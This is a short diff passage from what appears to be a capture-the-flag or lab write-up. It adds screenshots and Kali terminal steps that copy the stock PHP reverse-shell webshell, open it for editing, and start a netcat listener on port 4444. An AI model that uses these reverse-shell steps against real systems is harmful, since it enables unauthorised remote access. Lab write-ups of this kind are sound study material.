@@ -1031,3 +1031,24 @@ After deciding that it is too much of a hassle to fix those broken scripts, I've
 
 ![](attachments/Pasted%20image%2020250214215833.png)
 
+![](attachments/Pasted%20image%2020250214220342.png)
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano php-reverse-shell.php 
+
+```
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -nvlp 4444                                               
+listening on [any] 4444 ...
+
+
+```
+
+![](attachments/Pasted%20image%2020250214220428.png)
+
